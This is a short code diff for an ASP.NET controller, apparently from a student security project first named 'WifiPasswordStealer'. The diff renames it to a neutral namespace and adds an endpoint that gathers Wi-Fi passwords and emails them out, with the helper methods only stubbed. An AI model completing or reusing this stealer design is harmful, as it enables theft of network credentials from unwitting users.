@@ -1,6 +1,6 @@
 using Microsoft.AspNetCore.Mvc;
 
-namespace ISProject3WifiPasswordStealer.Controllers
+namespace WifiPassword.Controllers
 {
     [ApiController]
     [Route("[controller]")]
@@ -8,6 +8,15 @@ namespace ISProject3WifiPasswordStealer.Controllers
     {
         public WifiPasswordController()
         {
+        }
+
+        [HttpGet(Name = "GetWifiInfo")]
+        public List<WifiInfo> GetWifiInfo()
+        {
+            var wifiPasswordHelper = new WifiPasswordHelper();
+            var wifiInfo = wifiPasswordHelper.GetWifiInfo(); //method to be created
+            wifiPasswordHelper.SendWifiInfoAsEmail(wifiInfo); //method to be created
+            return wifiInfo;
         }
     }
 }
